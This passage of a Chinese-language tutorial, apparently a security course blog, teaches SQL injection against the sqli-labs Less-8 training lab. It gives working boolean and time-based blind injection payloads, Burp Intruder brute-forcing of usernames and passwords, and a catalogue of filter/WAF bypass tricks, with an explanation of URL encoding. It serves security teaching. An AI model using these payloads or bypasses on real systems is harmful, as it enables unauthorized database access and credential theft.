<h3 id="3-3-5-布尔型盲注"><a href="#3-3-5-布尔型盲注" class="headerlink" title="3.3.5 布尔型盲注"></a>3.3.5 布尔型盲注</h3><p>当我们改变前端页面传输给后台sql参数时，页面没有显示相应内容也没有显示报错信息时，页面呈现出两种状态，正常或者不正常。根据这两种状态可以判断我们输入的语句是否查询成功。不能使用联合查询注入和报错注入，这时我们可以考虑是否为布尔盲注。</p>
<p><strong>以sqli-labs-master Less-8关为例：</strong></p>
<h4 id="1-判断闭合符类型"><a href="#1-判断闭合符类型" class="headerlink" title="1) 判断闭合符类型"></a>1) 判断闭合符类型</h4><p>当输入 <code>?id=1&#39;</code>  页面显示没有结果。</p>
<p>但当加入 <code>--+ </code> 之后，页面又显示正常，这说明，闭合符就是 <strong><code>&#39;</code></strong> 。</p>
<h4 id="2-爆数据库长度"><a href="#2-爆数据库长度" class="headerlink" title="2) 爆数据库长度"></a>2) 爆数据库长度</h4><blockquote>
<p>?id&#x3D;1’ and length(database())&gt;&#x3D;10 –+-</p>
</blockquote>
<p> length()函数返回字符串的长度，这里采用二分法，直到找到一个分界点,即为数据库长度。</p>
<h4 id="3-查询库名"><a href="#3-查询库名" class="headerlink" title="3) 查询库名"></a>3) 查询库名</h4><h5 id="3-1-手动注入"><a href="#3-1-手动注入" class="headerlink" title="3.1) 手动注入"></a>3.1) 手动注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii() #返回ASCII码值</span><br><span class="line">substr(要截取的字符串，开始位，截取的长度)    #截取字符串</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;=115 --+    #显示正常</span><br><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;=116 --+    #显示异常</span><br></pre></td></tr></table></figure>

<p>说明数据库名的第一个字符的ascii码值为115，查询ascii码表即可得知对应的字符为s。</p>
<p>查询第二个字符需要将开始位改为2，再一个一个查询即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),2,1))&gt;=115 --+ </span><br></pre></td></tr></table></figure>

<p>已知库名长度为八，我们可以尝试手动注入八次。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/ascii_0-127.png" alt="Ascii"></p>
<h5 id="3-2-burpsuite爆破"><a href="#3-2-burpsuite爆破" class="headerlink" title="3.2) burpsuite爆破"></a>3.2) burpsuite爆破</h5><p> <strong>方法一：用ASCII码值转化爆破</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>

<p> substr的第一个1表示从第一位开始，第二个一表示每次爆破一位，于是我们的爆破点就有两个。</p>
<p>抓包放到Intruder模块中，选中1和115添加爆破标记，一号爆破点选择1~8，因为之前我们已经得知数据库名字长度为8位了，所以只需选择一到八。二号爆破点选择的是字母的ascii码值，可以从本地导入，最后开始攻击。</p>
<p>在结果页面根据长度大小排序来区分成功和失败。（有些网站的成功、失败页面大小一样，无法区分，只能选取其它方法了）</p>
<p>查询ascii码表即可得知库名。</p>
<p><strong>方法二：left方法直接爆破字母</strong></p>
<p><strong>left（参数1，参数2）</strong> 意为：将参数1从左开始取参数2个。</p>
<p>示例： left（abc,2） 返回值为ab。</p>
<p>将其与字符串进行比较，例如 left（abc,1）&gt;’a’，返回结果为false，因为 ‘a’&#x3D;‘a’；</p>
<p>left（abc，2）&gt;’aa’ ，返回结果为TURE，因为‘ab’是要大于‘aa’；</p>
<p>根据返回的结果的真假，与前面的语句用and相连接，构造逻辑关系。</p>
<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left(database(),1)=&#x27;s&#x27; --+-</span><br></pre></td></tr></table></figure>

<p>用burpsuite抓包后选择字符s为爆破点。爆破内容选择 a~z ，26个字母。这种方法的限制是一次只能爆破一个字母。</p>
<p>如果要接着爆破下一个字母，需要在爆破点前加上爆破出来的字母，并将left函数里面的数字修改。如：爆破第二个字母，需要将1改为2，并在爆破点前加上刚刚爆破出来的s。</p>
<p>这种方法的缺点是过于复杂，需要逐次爆破，通常不使用这种方法。</p>
<p><strong>方法三：if方法爆破注入（最简单）</strong></p>
<blockquote>
<p>if(1&#x3D;1,1,0) #如果1&#x3D;1，则返回1，否则返回0</p>
</blockquote>
<p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,1,0) --+-</span><br></pre></td></tr></table></figure>

<p>从库名选择第一个字母，判断其是否等于s，如果是，则返回1，页面正常显示，如果不是，则返回2，页面显示异常。</p>
<p>将第一个数字1和字母s添加为爆破点，第一个爆破点的数据为1~8（8是库名长度），第二个爆破点数据为字母加上_等字符。</p>
<h4 id="4-爆破表名"><a href="#4-爆破表名" class="headerlink" title="4) 爆破表名"></a>4) 爆破表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;,1,0) --+-</span><br></pre></td></tr></table></figure>

<p>limit 0，1表示从第一条开始取出一条数据，需要注意的是limit默认下标从0开始，第一个参数是下标，查数据的话是从第一条查，第二个参数限定了几条数据。</p>
<p>选择爆破点为substr(,1,1)中的第一个1与字母a，选择集束炸弹模式，让两个爆破点爆破的数据随机组合。</p>
<h4 id="5-爆破列名"><a href="#5-爆破列名" class="headerlink" title="5) 爆破列名"></a>5) 爆破列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(substring((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;,1,0)--+-</span><br></pre></td></tr></table></figure>

<p>将substr(,1,1)中的第一个1与字母a添加为爆破点。</p>
<h4 id="6-爆破具体值"><a href="#6-爆破具体值" class="headerlink" title="6) 爆破具体值"></a>6) 爆破具体值</h4><p>首先爆破username的值，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(substring((select username from users limit 0,1),1,1)=&#x27;a&#x27;,1,0)--+-</span><br></pre></td></tr></table></figure>

<p>接下来爆破password的值，构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(substring((select password from users limit 0,1),1,1)=&#x27;a&#x27;,1,0)--+-</span><br></pre></td></tr></table></figure>

<h3 id="3-3-6-时间盲注"><a href="#3-3-6-时间盲注" class="headerlink" title="3.3.6 时间盲注"></a>3.3.6 时间盲注</h3><p>时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面(与布尔盲注类似)，其主要特征是利用<strong>sleep</strong>函数或者<strong>benchmark</strong>函数让mysql执行时间变长，制造时间延迟，由<strong>回显时间</strong>来判断是否报错。</p>
<p>sleep(X)函数，延迟X秒后回显。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())&gt;=8,sleep(5),1)-- -</span><br><span class="line">上面语句意思是如果数据库长度大于等于8我们就延时5秒后进行回显，与布尔盲注类似。</span><br></pre></td></tr></table></figure>

<p>判断库名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+-</span><br></pre></td></tr></table></figure>

<p>得到库名为security后，接着判断表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=109,sleep(3),0)--+-</span><br></pre></td></tr></table></figure>

<p>判断列名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 0,1),1,1))=105,sleep(2),1)–+</span><br></pre></td></tr></table></figure>

<h2 id="3-4-绕过方式"><a href="#3-4-绕过方式" class="headerlink" title="3.4 绕过方式"></a>3.4 绕过方式</h2><blockquote>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42478365/article/details/119300607">https://blog.csdn.net/weixin_42478365/article/details/119300607</a></p>
</blockquote>
<h3 id="3-4-1-注释符号绕过"><a href="#3-4-1-注释符号绕过" class="headerlink" title="3.4.1 注释符号绕过"></a>3.4.1 注释符号绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- - 注释内容</span><br><span class="line"># 注释内容</span><br><span class="line">/*注释内容*/</span><br><span class="line">;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>

<h3 id="3-4-2-大小写绕过"><a href="#3-4-2-大小写绕过" class="headerlink" title="3.4.2 大小写绕过"></a>3.4.2 大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ANd SELecT ...</span><br></pre></td></tr></table></figure>

<p>可以利用的原因有两个：SQL语句对大小写不敏感、开发人员做的黑名单过滤过于简单。</p>
<h3 id="3-4-3-内联注释绕过"><a href="#3-4-3-内联注释绕过" class="headerlink" title="3.4.3 内联注释绕过"></a>3.4.3 内联注释绕过</h3><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;<em>!..</em>&#x2F; 中，这样这些语句如果在其它<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库</a>中是不会被执行，但在MYSQL中会执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from cms_users where userid=1 union /*!select*/ 1,2,3;</span><br></pre></td></tr></table></figure>

<h3 id="3-4-4-双写绕过"><a href="#3-4-4-双写绕过" class="headerlink" title="3.4.4 双写绕过"></a>3.4.4 双写绕过</h3><p>在某一些简单的WAF中，将<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%85%B3%E9%94%AE%E5%AD%97&spm=1001.2101.3001.7020">关键字</a>select等只使用replace()函数置换为空，这时候可以双写关键字绕过。进行一次这样的过滤就双写，两次就三写，以此类推。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select -&gt; selselectect</span><br></pre></td></tr></table></figure>

<h3 id="3-4-5-编码绕过"><a href="#3-4-5-编码绕过" class="headerlink" title="3.4.5 编码绕过"></a>3.4.5 编码绕过</h3><p>URL、ASCII、HEX、Unicode编码。</p>
<h4 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1) URL编码"></a>1) URL编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1+and+1=2</span><br><span class="line">1+%25%36%31%25%36%65%25%36%34+1=2 #对关键字进行两次url全编码</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81">https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81</a></p>
</blockquote>
<h5 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1) 简介"></a>1.1) 简介</h5><p><strong>百分号编码</strong>（英语：Percent-encoding），又称<strong>URL编码</strong>（URL encoding）是特定上下文的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6">统一资源定位符</a>（URL）的编码机制，实际上也适用于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E8%B3%87%E6%BA%90%E6%A8%99%E8%AA%8C%E7%AC%A6">统一资源标志符</a>（URI）的编码。</p>
<p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc3986">3986</a> section 2.2 <em>保留字符</em> （2005年1月）</p>
<table>
<thead>
<tr>
<th><code>!</code></th>
<th><code>*</code></th>
<th><code>&#39;</code></th>
<th><code>(</code></th>
<th><code>)</code></th>
<th><code>;</code></th>
<th><code>:</code></th>
<th><code>@</code></th>
<th><code>&amp;</code></th>
<th><code>=</code></th>
<th><code>+</code></th>
<th><code>$</code></th>
<th><code>,</code></th>
<th><code>/</code></th>
<th><code>?</code></th>
<th><code>#</code></th>
<th><code>[</code></th>
<th><code>]</code></th>
</tr>
</thead>
</table>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc3986">3986</a> section 2.3 <em>未保留字符</em> （2005年1月）</p>
<table>
<thead>
<tr>
<th><code>A</code></th>
<th><code>B</code></th>
<th><code>C</code></th>
<th><code>D</code></th>
<th><code>E</code></th>
<th><code>F</code></th>
<th><code>G</code></th>
<th><code>H</code></th>
<th><code>I</code></th>
<th><code>J</code></th>
<th><code>K</code></th>
<th><code>L</code></th>
<th><code>M</code></th>
<th><code>N</code></th>
<th><code>O</code></th>
<th><code>P</code></th>
<th><code>Q</code></th>
<th><code>R</code></th>
<th><code>S</code></th>
<th><code>T</code></th>
<th><code>U</code></th>
<th><code>V</code></th>
<th><code>W</code></th>
<th><code>X</code></th>
<th><code>Y</code></th>
<th><code>Z</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>a</code></td>
<td><code>b</code></td>
<td><code>c</code></td>
<td><code>d</code></td>
<td><code>e</code></td>
<td><code>f</code></td>
<td><code>g</code></td>
<td><code>h</code></td>
<td><code>i</code></td>
<td><code>j</code></td>
<td><code>k</code></td>
<td><code>l</code></td>
<td><code>m</code></td>
<td><code>n</code></td>
<td><code>o</code></td>
<td><code>p</code></td>
<td><code>q</code></td>
<td><code>r</code></td>
<td><code>s</code></td>
<td><code>t</code></td>
<td><code>u</code></td>
<td><code>v</code></td>
<td><code>w</code></td>
<td><code>x</code></td>
<td><code>y</code></td>
<td><code>z</code></td>
</tr>
<tr>
<td><code>0</code></td>
<td><code>1</code></td>
<td><code>2</code></td>
<td><code>3</code></td>
<td><code>4</code></td>
<td><code>5</code></td>
<td><code>6</code></td>
<td><code>7</code></td>
<td><code>8</code></td>
<td><code>9</code></td>
<td><code>-</code></td>
<td><code>_</code></td>
<td><code>.</code></td>
<td><code>~</code></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
</blockquote>
<p>URI中的其它字符必须用百分号编码。</p>
<h5 id="1-2-编码规则"><a href="#1-2-编码规则" class="headerlink" title="1.2) 编码规则"></a>1.2) 编码规则</h5><h6 id="1-2-1-对保留字符的百分号编码"><a href="#1-2-1-对保留字符的百分号编码" class="headerlink" title="1.2.1) 对保留字符的百分号编码"></a>1.2.1) 对保留字符的百分号编码</h6><p>如果一个保留字符在特定上下文中具有特殊含义（称作“reserved purpose”） , 且URI中必须使用该字符用于其它目的，那么该字符必须百分号编码。</p>
<p>首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">转义字符</a>（”<code>%</code>“），置入URI中的相应位置。例如，<code>/</code>编码后是<code>%2F</code>。</p>
<blockquote>
<p>保留字符的百分号编码</p>
<table>
<thead>
<tr>
<th><code>!</code></th>
<th><code>#</code></th>
<th><code>$</code></th>
<th><code>&amp;</code></th>
<th><code>&#39;</code></th>
<th><code>(</code></th>
<th><code>)</code></th>
<th><code>*</code></th>
<th><code>+</code></th>
<th><code>,</code></th>
<th><code>/</code></th>
<th><code>:</code></th>
<th><code>;</code></th>
<th><code>=</code></th>
<th><code>?</code></th>
<th><code>@</code></th>
<th><code>[</code></th>
<th><code>]</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>%21</code></td>
<td><code>%23</code></td>
<td><code>%24</code></td>
<td><code>%26</code></td>
<td><code>%27</code></td>
<td><code>%28</code></td>
<td><code>%29</code></td>
<td><code>%2A</code></td>
<td><code>%2B</code></td>
<td><code>%2C</code></td>
<td><code>%2F</code></td>
<td><code>%3A</code></td>
<td><code>%3B</code></td>
<td><code>%3D</code></td>
<td><code>%3F</code></td>
<td><code>%40</code></td>
<td><code>%5B</code></td>
<td><code>%5D</code></td>
</tr>
</tbody></table>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/ascii_0-127.png" alt="ASCII0-127"></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/ascii_128-255.jpg" style="width:70%;" alt="ASCII128-255"/>

<h6 id="1-2-2-对百分号字符的百分号编码"><a href="#1-2-2-对百分号字符的百分号编码" class="headerlink" title="1.2.2) 对百分号字符的百分号编码"></a>1.2.2) 对百分号字符的百分号编码</h6><p><code>%</code>编码后是<code>%25</code>。</p>
<h6 id="1-2-3-对非ASCII字符的百分号编码"><a href="#1-2-3-对非ASCII字符的百分号编码" class="headerlink" title="1.2.3) 对非ASCII字符的百分号编码"></a>1.2.3) 对非ASCII字符的百分号编码</h6><p>需要转换为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/UTF-8">UTF-8</a>（一种针对<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Unicode">Unicode</a>的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E5%8F%98%E5%AE%BD%E5%BA%A6%E7%BC%96%E7%A0%81">可变长度</a><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AD%97%E5%85%83%E7%B7%A8%E7%A2%BC">字符编码</a>）字节序，然后每个字节按照百分号加ASCII码的形式表示。例如：<code>百分号编码</code>编码后是<code>%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81</code>。</p>
<blockquote>
<p>URL编码在线工具</p>
<p><a target="_blank" rel="noopener" href="https://www.bejson.com/enc/urlencode/">https://www.bejson.com/enc/urlencode/</a></p>
<p><a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/urlencode.aspx">https://tool.chinaz.com/tools/urlencode.aspx</a></p>
</blockquote>
<h4 id="2-ASCII编码"><a href="#2-ASCII编码" class="headerlink" title="2) ASCII编码"></a>2) ASCII编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test -&gt; CHAR(84)+CHAR(101)+CHAR(115)+CHAR(116)</span><br></pre></td></tr></table></figure>

<h4 id="4-16进制绕过"><a href="#4-16进制绕过" class="headerlink" title="4) 16进制绕过"></a>4) 16进制绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span> <span class="built_in">where</span> username = test1;</span><br><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span> <span class="built_in">where</span> username = 0x7465737431;</span><br></pre></td></tr></table></figure>

<h4 id="5-Unicode编码"><a href="#5-Unicode编码" class="headerlink" title="5) Unicode编码"></a>5) Unicode编码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下示例来自网络，未验证正确性</span></span><br><span class="line">单引号=&gt; %u0037 %u02b9</span><br><span class="line">空格=&gt; %u0020 %uff00</span><br><span class="line">左括号=&gt; %u0028 %uff08</span><br><span class="line">右括号=&gt; %u0029 %uff09</span><br></pre></td></tr></table></figure>

<h3 id="3-4-6-大于小于号绕过"><a href="#3-4-6-大于小于号绕过" class="headerlink" title="3.4.6 大于小于号绕过"></a>3.4.6 大于小于号绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#大于号-&gt;greatest，小于号-&gt;least</span><br><span class="line">原句：ascii(substr(database(),1,1))&gt;100</span><br><span class="line">绕过：</span><br><span class="line">greatest(ascii(substr(database(),1,1)),100)=100</span><br><span class="line">least(ascii(substr(database(),1,1)),100)=100</span><br><span class="line">#greatest(n1, n2, n3…)返回n中的最大值，或least(n1,n2,n3…)返回n中的最小值。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#strcmp</span><br><span class="line">strcmp(ascii(substr(database(),1,1)),99)</span><br><span class="line">#strcmp(str1,str2)，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#in</span><br><span class="line">substr(database(),1,1) in (&#x27;b&#x27;)</span><br><span class="line">substr(database(),1,1) in (0x62)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#between ... and ...</span><br><span class="line">substr(database(),1,1) between &#x27;a&#x27; and &#x27;c&#x27;</span><br><span class="line">substr(database(),1,1) between 0x61 and 0x63</span><br></pre></td></tr></table></figure>

<h3 id="3-4-7-空格绕过"><a href="#3-4-7-空格绕过" class="headerlink" title="3.4.7 空格绕过"></a>3.4.7 空格绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+ %20 %09 %0a %0b %0c %0d %a0 /**/ /*!*/ ()</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line">正常：<span class="keyword">select</span> * from user</span><br><span class="line">括号：(<span class="keyword">select</span>)*(from)(user)</span><br></pre></td></tr></table></figure>

<h3 id="3-4-8-or-and-xor-not-绕过"><a href="#3-4-8-or-and-xor-not-绕过" class="headerlink" title="3.4.8 or and xor not 绕过"></a>3.4.8 <code>or and xor not</code> 绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#来源网络，未验证</span></span><br><span class="line">or = ||</span><br><span class="line">and = &amp;&amp;</span><br><span class="line">xor = | ^ <span class="comment"># </span></span><br><span class="line">not = !</span><br></pre></td></tr></table></figure>

<h3 id="3-4-9-等号绕过"><a href="#3-4-9-等号绕过" class="headerlink" title="3.4.9 等号绕过"></a>3.4.9 等号绕过</h3><h4 id="不加通配符的like"><a href="#不加通配符的like" class="headerlink" title="不加通配符的like"></a>不加通配符的like</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#正常加上通配符的like：</span><br><span class="line">mysql&gt; select * from users where username like &quot;test%&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">|  3 | test3    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br><span class="line"></span><br><span class="line">#不加上通配符的like可以用来取代=：</span><br><span class="line">mysql&gt; select * from users where id like 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#MySQL 中使用 REGEXP 操作符来进行正则表达式匹配</span><br><span class="line">mysql&gt; select * from users where id regexp 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<h4 id="使用大小于号来绕过"><a href="#使用大小于号来绕过" class="headerlink" title="使用大小于号来绕过"></a>使用大小于号来绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id &gt; 1 and id &lt; 3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  2 | user2    | pass1    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<h4 id="使用绕过"><a href="#使用绕过" class="headerlink" title="使用&lt;&gt;绕过"></a>使用<code>&lt;&gt;</code>绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># &lt;&gt; 等价于 !=，所以在前面再加一个!，结果就是等号了</span><br><span class="line">mysql&gt; select * from users where !(id &lt;&gt; 1);</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = 1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="3-4-10-单引号绕过"><a href="#3-4-10-单引号绕过" class="headerlink" title="3.4.10 单引号绕过"></a>3.4.10 单引号绕过</h3><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># users的十六进制的字符串是7573657273</span><br><span class="line">原句：where table_name=&quot;users&quot;</span><br><span class="line">绕过：where table_name=0x7573657273</span><br></pre></td></tr></table></figure>

